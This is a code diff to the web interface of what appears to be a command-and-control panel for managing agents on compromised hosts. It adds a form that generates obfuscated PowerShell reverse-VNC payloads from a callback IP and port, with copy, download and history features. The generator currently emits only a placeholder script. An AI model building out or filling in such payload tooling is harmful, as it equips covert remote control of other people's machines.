@@ -254,22 +254,129 @@
         </div>
       </el-tab-pane>
 
-      <!-- VNC Panel (Placeholder for future implementation) -->
+      <!-- VNC Panel - Reverse VNC Payload Generator -->
       <el-tab-pane label="Remote Control" name="vnc">
         <div class="vnc-panel">
           <div class="panel-header">
-            <h3>Remote Control & VNC</h3>
-            <el-button type="primary" disabled>
-              <el-icon><Monitor /></el-icon>
-              Connect VNC (Coming Soon)
-            </el-button>
+            <h3>Reverse VNC Payload Generator</h3>
+            <p>Generate obfuscated PowerShell VNC payloads for remote screen control</p>
           </div>
           
-          <div class="empty-state">
-            <el-icon size="48"><Monitor /></el-icon>
-            <h3>Remote Control Features</h3>
-            <p>VNC and remote control functionality will be implemented in future versions.</p>
-            <p>This will allow direct screen sharing and remote control of compromised hosts.</p>
+          <!-- VNC Configuration Form -->
+          <div class="vnc-generator">
+            <el-form :model="vncForm" label-width="150px" class="vnc-form">
+              <el-row :gutter="20">
+                <el-col :span="12">
+                  <el-form-item label="LHOST (Your IP):">
+                    <el-input v-model="vncForm.lhost" placeholder="192.168.1.100" />
+                    <span class="form-help">Your server's IP address</span>
+                  </el-form-item>
+                </el-col>
+                <el-col :span="12">
+                  <el-form-item label="LPORT (VNC Port):">
+                    <el-input v-model="vncForm.lport" placeholder="5900" />
+                    <span class="form-help">Port for VNC connection (default: 5900)</span>
+                  </el-form-item>
+                </el-col>
+              </el-row>
+              
+              <el-row :gutter="20">
+                <el-col :span="12">
+                  <el-form-item label="Obfuscation Level:">
+                    <el-select v-model="vncForm.obfuscation" placeholder="Select obfuscation">
+                      <el-option label="None" value="none" />
+                      <el-option label="Basic" value="basic" />
+                      <el-option label="Advanced" value="advanced" />
+                      <el-option label="Maximum" value="maximum" />
+                    </el-select>
+                  </el-form-item>
+                </el-col>
+                <el-col :span="12">
+                  <el-form-item label="Payload Type:">
+                    <el-select v-model="vncForm.payloadType" placeholder="Select payload type">
+                      <el-option label="Loader + Obfuscator" value="loader" />
+                      <el-option label="Raw Payload" value="raw" />
+                      <el-option label="One-liner" value="oneliner" />
+                    </el-select>
+                  </el-form-item>
+                </el-col>
+              </el-row>
+              
+              <el-form-item>
+                <el-button type="primary" @click="generateVncPayload" :loading="generatingVnc">
+                  <el-icon><Setting /></el-icon>
+                  Generate VNC Payload
+                </el-button>
+                <el-button @click="clearVncForm">
+                  <el-icon><Delete /></el-icon>
+                  Clear
+                </el-button>
+                <el-button type="info" @click="autoFillVncFromConfig">
+                  <el-icon><Connection /></el-icon>
+                  Use Server Config
+                </el-button>
+              </el-form-item>
+            </el-form>
+          </div>
+          
+          <!-- Generated VNC Payload Output -->
+          <div v-if="generatedVncPayload" class="vnc-output">
+            <h3>Generated VNC Payload:</h3>
+            <div class="vnc-info">
+              <p><strong>LHOST:</strong> {{ vncForm.lhost }}</p>
+              <p><strong>LPORT:</strong> {{ vncForm.lport }}</p>
+              <p><strong>Obfuscation:</strong> {{ vncForm.obfuscation }}</p>
+              <p><strong>Type:</strong> {{ vncForm.payloadType }}</p>
+              <p><strong>Generated:</strong> {{ new Date().toLocaleString() }}</p>
+            </div>
+            <div class="code-container">
+              <el-input
+                v-model="generatedVncPayload"
+                type="textarea"
+                :rows="12"
+                readonly
+                class="vnc-code"
+              />
+              <div class="code-actions">
+                <el-button type="success" @click="copyVncPayload">
+                  <el-icon><CopyDocument /></el-icon>
+                  Copy Payload
+                </el-button>
+                <el-button type="warning" @click="downloadVncPayload">
+                  <el-icon><Download /></el-icon>
+                  Download as .ps1
+                </el-button>
+                <el-button type="info" @click="saveVncToHistory">
+                  <el-icon><Star /></el-icon>
+                  Save to History
+                </el-button>
+              </div>
+            </div>
+          </div>
+          
+          <!-- VNC Payload History -->
+          <div class="vnc-history">
+            <h3>VNC Payload History</h3>
+            <el-table :data="vncHistory" style="width: 100%" class="vnc-history-table">
+              <el-table-column prop="timestamp" label="Generated" width="180" />
+              <el-table-column prop="lhost" label="LHOST" width="120" />
+              <el-table-column prop="lport" label="LPORT" width="80" />
+              <el-table-column prop="obfuscation" label="Obfuscation" width="100" />
+              <el-table-column prop="payloadType" label="Type" width="120" />
+              <el-table-column prop="payload" label="Payload" width="300" />
+              <el-table-column label="Actions" width="150">
+                <template #default="scope">
+                  <el-button size="small" @click="loadVncFromHistory(scope.row)">
+                    <el-icon><View /></el-icon>
+                    Load
+                  </el-button>
+                  <el-button size="small" type="danger" @click="deleteVncFromHistory(scope.row)">
+                    <el-icon><Delete /></el-icon>
+                    Delete
+                  </el-button>
+                </template>
+              </el-table-column>
+            </el-table>
           </div>
         </div>
       </el-tab-pane>
@@ -445,6 +552,28 @@ const listenerForm = ref({
 })
 const creatingListener = ref(false)
 
+// VNC Payload Generator
+const vncForm = ref({
+  lhost: '',
+  lport: '5900',
+  obfuscation: 'basic',
+  payloadType: 'loader'
+})
+const generatingVnc = ref(false)
+const generatedVncPayload = ref('')
+
+interface VncHistoryItem {
+  id: string
+  timestamp: string
+  lhost: string
+  lport: string
+  obfuscation: string
+  payloadType: string
+  payload: string
+}
+
+const vncHistory = ref<VncHistoryItem[]>([])
+
 // Agent management
 const agents = ref<any[]>([])
 
@@ -470,10 +599,63 @@ const availableProfiles = ref<Profile[]>([])
 const loadProfiles = async () => {
   try {
     const response = await fetch('/api/profile/list')
+    
+    if (!response.ok) {
+      console.warn('Profile API not available, using default profiles')
+      // Use default profiles from config
+      availableProfiles.value = [
+        {
+          id: 'default',
+          name: 'Default TLS Profile',
+          host: '0.0.0.0',
+          port: 8443,
+          useTLS: true,
+          pollInterval: 5,
+          isActive: true,
+          createdAt: new Date().toISOString(),
+          updatedAt: new Date().toISOString()
+        }
+      ]
+      return
+    }
+    
+    const contentType = response.headers.get('content-type')
+    if (!contentType || !contentType.includes('application/json')) {
+      console.warn('Profile API returned non-JSON response, using default profiles')
+      availableProfiles.value = [
+        {
+          id: 'default',
+          name: 'Default TLS Profile',
+          host: '0.0.0.0',
+          port: 8443,
+          useTLS: true,
+          pollInterval: 5,
+          isActive: true,
+          createdAt: new Date().toISOString(),
+          updatedAt: new Date().toISOString()
+        }
+      ]
+      return
+    }
+    
     const data = await response.json()
     availableProfiles.value = data.profiles || []
   } catch (error) {
     console.error('Failed to load profiles:', error)
+    // Use default profiles on error
+    availableProfiles.value = [
+      {
+        id: 'default',
+        name: 'Default TLS Profile',
+        host: '0.0.0.0',
+        port: 8443,
+        useTLS: true,
+        pollInterval: 5,
+        isActive: true,
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString()
+      }
+    ]
   }
 }
 
@@ -686,6 +868,114 @@ const disconnectAgent = async (agent: any) => {
     
     // TODO: Implement actual agent disconnection logic
     ElMessage.success(`Disconnected agent: ${agent.hostname}`)
+  } catch {
+    // User cancelled
+  }
+}
+
+// VNC Payload Generator Functions
+const generateVncPayload = async () => {
+  if (!vncForm.value.lhost || !vncForm.value.lport) {
+    ElMessage.error('Please provide LHOST and LPORT')
+    return
+  }
+  
+  generatingVnc.value = true
+  
+  try {
+    // TODO: Replace with actual PowerShell VNC payload generation
+    // This is a placeholder - you'll provide the actual PowerShell code
+    const payload = `# VNC Payload for ${vncForm.value.lhost}:${vncForm.value.lport}
+# Obfuscation: ${vncForm.value.obfuscation}
+# Type: ${vncForm.value.payloadType}
+
+# Your PowerShell VNC code will go here
+# LHOST: ${vncForm.value.lhost}
+# LPORT: ${vncForm.value.lport}
+
+Write-Host "VNC Payload generated for ${vncForm.value.lhost}:${vncForm.value.lport}"`
+    
+    generatedVncPayload.value = payload
+    ElMessage.success('VNC payload generated successfully!')
+  } catch (error) {
+    ElMessage.error('Failed to generate VNC payload: ' + error)
+  } finally {
+    generatingVnc.value = false
+  }
+}
+
+const clearVncForm = () => {
+  vncForm.value = {
+    lhost: '',
+    lport: '5900',
+    obfuscation: 'basic',
+    payloadType: 'loader'
+  }
+  generatedVncPayload.value = ''
+}
+
+const autoFillVncFromConfig = () => {
+  // Auto-fill from server configuration
+  vncForm.value.lhost = '127.0.0.1' // Default to localhost
+  ElMessage.success('Auto-filled VNC configuration from server settings')
+}
+
+const copyVncPayload = async () => {
+  try {
+    await navigator.clipboard.writeText(generatedVncPayload.value)
+    ElMessage.success('VNC payload copied to clipboard')
+  } catch (error) {
+    ElMessage.error('Failed to copy VNC payload')
+  }
+}
+
+const downloadVncPayload = () => {
+  const blob = new Blob([generatedVncPayload.value], { type: 'text/plain' })
+  const url = URL.createObjectURL(blob)
+  const a = document.createElement('a')
+  a.href = url
+  a.download = `vnc_payload_${vncForm.value.lhost}_${vncForm.value.lport}.ps1`
+  document.body.appendChild(a)
+  a.click()
+  document.body.removeChild(a)
+  URL.revokeObjectURL(url)
+  ElMessage.success('VNC payload downloaded')
+}
+
+const saveVncToHistory = () => {
+  const historyItem = {
+    id: Date.now().toString(),
+    timestamp: new Date().toLocaleString(),
+    lhost: vncForm.value.lhost,
+    lport: vncForm.value.lport,
+    obfuscation: vncForm.value.obfuscation,
+    payloadType: vncForm.value.payloadType,
+    payload: generatedVncPayload.value
+  }
+  
+  vncHistory.value.unshift(historyItem)
+  ElMessage.success('VNC payload saved to history')
+}
+
+const loadVncFromHistory = (item: any) => {
+  vncForm.value.lhost = item.lhost
+  vncForm.value.lport = item.lport
+  vncForm.value.obfuscation = item.obfuscation
+  vncForm.value.payloadType = item.payloadType
+  generatedVncPayload.value = item.payload
+  ElMessage.success('VNC payload loaded from history')
+}
+
+const deleteVncFromHistory = async (item: any) => {
+  try {
+    await ElMessageBox.confirm(
+      'Delete this VNC payload from history?',
+      'Delete VNC Payload',
+      { confirmButtonText: 'Delete', cancelButtonText: 'Cancel', type: 'warning' }
+    )
+    
+    vncHistory.value = vncHistory.value.filter(h => h.id !== item.id)
+    ElMessage.success('VNC payload deleted from history')
   } catch {
     // User cancelled
   }
@@ -1237,6 +1527,85 @@ const loadDashboardData = async () => {
 }
 
 .agents-panel .agent-history-table {
+  margin-top: 15px;
+}
+
+/* VNC Panel */
+.vnc-panel {
+  padding: 20px;
+}
+
+.vnc-panel .panel-header {
+  margin-bottom: 20px;
+}
+
+.vnc-panel .panel-header h3 {
+  margin: 0 0 10px 0;
+  color: var(--text-white);
+}
+
+.vnc-panel .panel-header p {
+  color: var(--text-gray);
+  margin: 0;
+}
+
+.vnc-panel .vnc-generator {
+  background: var(--secondary-black);
+  padding: 20px;
+  border-radius: 8px;
+  margin-bottom: 20px;
+}
+
+.vnc-panel .vnc-form {
+  max-width: 800px;
+}
+
+.vnc-panel .form-help {
+  color: var(--text-gray);
+  font-size: 12px;
+  margin-left: 8px;
+}
+
+.vnc-panel .vnc-output {
+  background: var(--secondary-black);
+  padding: 20px;
+  border-radius: 8px;
+  margin-bottom: 20px;
+}
+
+.vnc-panel .vnc-info {
+  margin-bottom: 15px;
+}
+
+.vnc-panel .vnc-info p {
+  margin: 5px 0;
+  color: var(--text-gray);
+}
+
+.vnc-panel .vnc-code {
+  font-family: 'Courier New', monospace;
+  background: var(--primary-black);
+  border: 1px solid var(--border-color);
+}
+
+.vnc-panel .code-actions {
+  margin-top: 15px;
+  display: flex;
+  gap: 10px;
+}
+
+.vnc-panel .vnc-history {
+  background: var(--secondary-black);
+  padding: 20px;
+  border-radius: 8px;
+}
+
+.vnc-panel .vnc-history h3 {
+  margin: 0 0 15px 0;
+  color: var(--text-white);
+}
+
+.vnc-panel .vnc-history-table {
   margin-top: 15px;
 }
 
